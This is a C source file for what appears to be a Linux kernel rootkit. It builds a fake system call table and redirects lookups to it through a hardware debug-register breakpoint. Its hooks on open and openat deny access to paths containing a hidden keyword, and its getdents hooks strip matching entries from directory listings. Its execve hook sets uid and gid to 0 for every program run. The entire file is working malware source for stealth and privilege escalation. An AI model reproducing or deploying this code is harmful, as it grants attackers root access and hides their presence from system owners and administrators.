#include "syscall_table.h"
#include "hook.h"
#include "dr_breakpoints.h"
#include "utils.h"

typedef asmlinkage long (*t_syscall)(const struct pt_regs *);

#define SYSCALL(sys) (t_syscall)sct[__NR_##sys]
#define HOOK(sys, func) fake_sct[__NR_##sys] = (unsigned long)func

static unsigned long fake_sct[436];
static unsigned long *sct;

/*
 * rax -> fake_sct index
 */
void handler(struct pt_regs *regs)
{
  unsigned long off;
  off = ((unsigned long)fake_sct - (unsigned long)sct);
  regs->di += off / sizeof(unsigned long);
}

static asmlinkage long new_sys_openat(const struct pt_regs *pt_regs)
{
  int res = 0;
  int pathlen;
  char *kpathname;
  
  t_syscall orig_syscall = SYSCALL(openat);
  int ret = orig_syscall(pt_regs);
  const char * pathname = (const char * )pt_regs->si;

  pathlen = strnlen_user(pathname, 256);
  kpathname = kzalloc(pathlen, GFP_KERNEL);
  if (kpathname == NULL)
	return -ENOENT;

  res = copy_from_user(kpathname, pathname, pathlen);
  if (res)
	return -EACCES;

  /* check for keyword */
  if (strstr(kpathname, TO_HIDE) != NULL) {
	kfree(kpathname);
	return -ENOENT;
  }

  kfree(kpathname);

  return ret;
}

static asmlinkage long new_sys_open(const struct pt_regs *pt_regs)
{
  int res = 0;
  int pathlen;
  char *kpathname;
  
  t_syscall orig_syscall = SYSCALL(open);
  int ret = orig_syscall(pt_regs);
  const char * pathname = (const char * )pt_regs->di;
  
  pathlen = strnlen_user(pathname, 256);
  kpathname = kzalloc(pathlen, GFP_KERNEL);
  if (kpathname == NULL)
	return -ENOENT;

  res = copy_from_user(kpathname, pathname, pathlen);
  if (res)
	return -EACCES;

  /* check for keyword */
  if (strstr(kpathname, TO_HIDE) != NULL) {
	kfree(kpathname);
	return -ENOENT;
  }

  kfree(kpathname);

  return ret;
}

static asmlinkage long new_sys_getdents64(const struct pt_regs *pt_regs)
{
  unsigned short proc = 0;
  unsigned long off = 0;
  struct linux_dirent64 *dir, *kdirent, *prev = NULL;
  struct inode *d_inode;
  
  int fd = (int) pt_regs->di;
  struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;

  t_syscall orig_syscall = SYSCALL(getdents64);
  int ret = orig_syscall(pt_regs), err;

  if (ret <= 0)
	return ret;

  kdirent = kzalloc(ret, GFP_KERNEL);
  if (kdirent == NULL)
	return ret;

  err = copy_from_user(kdirent, dirent, ret); // buffer is user space
  if (err) {
	kfree(kdirent);
	return ret;
  }

  d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;

  /* procfs root directory */
  if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
	proc = 1;
  /* iterate through entries */
  while (off < ret) {
	dir = (void *)kdirent + off;
	if ((!proc && (memcmp(TO_HIDE, dir->d_name, strlen(TO_HIDE)) == 0))) {
	  if (dir == kdirent) {
		/* hide current entry */
		ret -= dir->d_reclen;
		memmove(dir, (void *)dir + dir->d_reclen, ret);
		continue;
	  }
	  prev->d_reclen += dir->d_reclen;
	}
	else
	  prev = dir;
	off += dir->d_reclen;
  }
	
  /* send output buffer to user space */
  err = copy_to_user(dirent, kdirent, ret);
  if (err) {
	kfree(kdirent);
	return ret;
  }
  return ret;
}

static asmlinkage long new_sys_getdents(const struct pt_regs *pt_regs)
{
  unsigned short proc = 0;
  unsigned long off = 0;
  struct linux_dirent64 *dir, *kdirent, *prev = NULL;
  struct inode *d_inode;
  
  int fd = (int) pt_regs->di;
  struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;

  t_syscall orig_syscall = SYSCALL(getdents);
  int ret = orig_syscall(pt_regs), err;

  if (ret <= 0)
	return ret;

  kdirent = kzalloc(ret, GFP_KERNEL);
  if (kdirent == NULL)
	return ret;

  err = copy_from_user(kdirent, dirent, ret); // buffer is user space
  if (err) {
	kfree(kdirent);
	return ret;
  }

  d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;

  /* procfs root directory */
  if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
	proc = 1;
  /* iterate through entries */
  while (off < ret) {
	dir = (void *)kdirent + off;
	if ((!proc && (memcmp(TO_HIDE, dir->d_name, strlen(TO_HIDE)) == 0))) {
	  if (dir == kdirent) {
		/* hide current entry */
		ret -= dir->d_reclen;
		memmove(dir, (void *)dir + dir->d_reclen, ret);
		continue;
	  }
	  prev->d_reclen += dir->d_reclen;
	}
	else
	  prev = dir;
	off += dir->d_reclen;
  }
  /* send output buffer to user space */
  err = copy_to_user(dirent, kdirent, ret);
  if (err) {
	kfree(kdirent);
	return ret;
  }
  return ret;
}

static asmlinkage int new_sys_execve(const struct pt_regs *pt_regs)
{
  t_syscall orig_syscall = SYSCALL(execve);
  
  struct cred *np;
  kuid_t nuid;
  kgid_t ngid;

  /* set uid value to 0 */
  nuid.val = 0;

  /* set gid value to 0 */
  ngid.val = 0;

  /* prepare credentials to task_struct of current process */
  np = prepare_creds();

  /* set new cred struct */
  np->uid = nuid;
  np->euid = nuid;
  np->gid = ngid;
  np->egid = ngid;

  commit_creds(np);

  return orig_syscall(pt_regs);
}

int hook_syscall_table(void)
{
  unsigned long gd_addr;
  unsigned long call_sys_addr;

  table_ptr = sys_call_table_retrieve();
  sct = table_ptr;
  if (!sct)
	return -1;

  memcpy(fake_sct, sct, sizeof(fake_sct));

  HOOK(execve, new_sys_execve);
  HOOK(getdents64, new_sys_getdents64);
  HOOK(getdents, new_sys_getdents);
  HOOK(openat, new_sys_openat);
  HOOK(open, new_sys_open);

  call_sys_addr = get_syscall_64_addr();
  if (!call_sys_addr)
	return -ENXIO; // set errno to "no such device or address"
  gd_addr = get_gadget_addr(call_sys_addr);
  if (!gd_addr)
	return -ENXIO; // set errno to "no such device or address"
  
  reg_dr_bp(gd_addr, DR_RW_EXECUTE, DR_LEN_1, handler);

  return 0;
}
